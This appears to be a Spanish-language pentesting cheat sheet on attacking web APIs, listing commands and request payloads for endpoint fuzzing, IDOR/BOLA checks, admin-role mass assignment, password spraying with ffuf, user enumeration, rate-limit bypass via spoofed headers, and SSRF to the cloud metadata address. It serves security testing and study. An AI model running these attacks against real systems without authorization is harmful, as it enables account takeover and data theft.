---
tags: [web, api, rest, graphql]
status: done
---

# API Hacking

---

## Recon de APIs

```bash
# Descubrir endpoints
ffuf -u "https://target.com/FUZZ" -w api_wordlist.txt -mc 200,201,204,401,403
ffuf -u "https://target.com/api/v1/FUZZ" -w endpoints.txt

# Versiones de API
/api/v1/ /api/v2/ /api/v3/ /api/beta/ /api/internal/

# Documentación expuesta (oro)
/swagger.json
/swagger-ui.html
/openapi.json
/api-docs
/docs
/redoc

# Buscar en JS del frontend
grep -r "api\|endpoint\|/v1\|/v2" js_files/
```

---

## Autenticación

```bash
# Probar sin token
curl https://target.com/api/v1/users -i

# Token caducado → a veces sigue funcionando
Authorization: Bearer eyJ...[token expirado]

# JWT → [[07-web-hacking/oauth-y-jwt|OAuth y JWT]]

# API Key en diferentes sitios
Header:  X-API-Key: key
Query:   ?api_key=key  ?key=key  ?token=key
Body:    {"api_key": "key"}
```

---

## Broken Object Level Authorization (BOLA/IDOR)

```bash
# El punto más crítico en APIs REST
# Cambiar ID de objeto en la URL/body con otra cuenta

GET /api/v1/users/1234/orders      # tu usuario
GET /api/v1/users/1235/orders      # otro usuario → ¿obtienes sus datos?

# Probar con Burp: Autorize extension (comparar respuestas entre sesiones)

# IDs no secuenciales → a veces son UUIDs predecibles o expuestos en otros endpoints
GET /api/v1/orders/550e8400-e29b-41d4-a716-446655440000
```

---

## Broken Function Level Authorization

```bash
# Endpoints de admin accesibles por usuario normal
GET  /api/v1/admin/users
POST /api/v1/admin/users
DELETE /api/v1/users/123

# Métodos HTTP no restringidos
GET  /api/v1/users/123   → 200 OK
POST /api/v1/users/123   → ¿permitido?
PUT  /api/v1/users/123   → ¿modificar datos de otro?
DELETE /api/v1/users/123 → ¿borrar cuenta ajena?
```

---

## Mass Assignment

```bash
# La API acepta campos que no debería
# Registro normal:
POST /api/v1/users
{"username":"test","password":"test123"}

# Añadir campos admin:
{"username":"test","password":"test123","role":"admin","is_admin":true,"credits":9999}

# Ver qué campos devuelve el GET y probar añadirlos en el POST/PUT
```

---

## Rate Limit & Enumeración

```bash
# Password spray / brute force en API
ffuf -u "https://target.com/api/v1/auth/login" \
     -X POST \
     -H "Content-Type: application/json" \
     -d '{"email":"admin@target.com","password":"FUZZ"}' \
     -w passwords.txt

# Enumeración de usuarios vía respuesta diferente
{"email":"user@target.com","password":"wrong"} → "Invalid password"     # usuario existe
{"email":"nouser@target.com","password":"wrong"} → "User not found"     # no existe

# Bypass rate limit
X-Forwarded-For: 1.2.3.4    # cambiar por petición
X-Real-IP: 1.2.3.4
Cambiar User-Agent en cada petición
```

---

## SSRF via API

```bash
# Parámetros de URL en body de API
POST /api/v1/webhook
{"url": "http://169.254.169.254/latest/meta-data/"}

POST /api/v1/fetch
{"target": "http://internal-service.local/"}
```

---

## Herramientas

```bash
# kiterunner — wordlist específica de API endpoints
kr scan https://target.com -w routes-large.kite

# Postman — colecciones de APIs públicas de servicios conocidos
# Importar swagger.json → probar todos los endpoints automáticamente

# Burp Suite Extensions:
# - Autorize (BOLA automático)
# - JWT Editor
# - HTTP Request Smuggler
# - 403 Bypasser
```

